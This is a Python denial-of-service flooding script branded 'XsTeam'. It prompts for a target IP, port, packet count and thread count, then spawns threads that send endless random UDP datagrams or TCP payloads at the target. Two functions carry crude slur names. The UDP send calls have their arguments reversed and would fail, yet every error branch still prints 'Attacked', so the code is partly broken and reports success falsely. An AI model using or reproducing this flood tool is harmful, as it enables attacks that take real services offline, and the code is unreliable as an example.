import random
import time
import socket
import threading
print("\033[31m")
ip = str(input("====> Ip Hosting: "))
port = int(input("====> Port Hosting: "))
choice = str(input("====> Attacking? (y/n): "))
times = int(input("====> Packets: "))
threads = int(input("====> Threads: "))
print("\033[30;1m")
def xs1():
  data = random._urandom(666)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")

def xs2():
  data = random._urandom(666)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
def xs3():
  data = random._urandom(666)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
def xs4():
  data = random._urandom(666)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")

def xs5():
  data = random._urandom(666)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")

def xs6():
  data = random._urandom(666)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")

def xs7():
  data = random._urandom(666)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")

def xs8():
  data = random._urandom(666)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")

def xs9():
  data = random._urandom(666)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")

def xs10():
  data = random._urandom(666)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")

def kntl():
  data = random._urandom(2000)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      s.close()
      print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")

def memek():
  data = random._urandom(2000)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")
    except:
      s.close()
      print(f"\033[31;1m XsTeam Attacked Ip Port \033[30;1m{ip}:{port}")

for y in range(threads):
  if choice == "y":
    th = threading.Thread(target = xs1)
    th.start()
    th = threading.Thread(target = xs2)
    th.start()
    th = threading.Thread(target = xs3)
    th.start()
    th = threading.Thread(target = xs4)
    th.start()
    th = threading.Thread(target = xs5)
    th.start()
    th = threading.Thread(target = xs6)
    th.start()
    th = threading.Thread(target = xs7)
    th.start()
    th = threading.Thread(target = xs8)
    th.start()
    th = threading.Thread(target = xs9)
    th.start()
    th = threading.Thread(target = xs10)
    th.start()
  else:
    th = threading.Thread(target = kntl)
    th.start()
    th = threading.Thread(target = memek)
    th.start()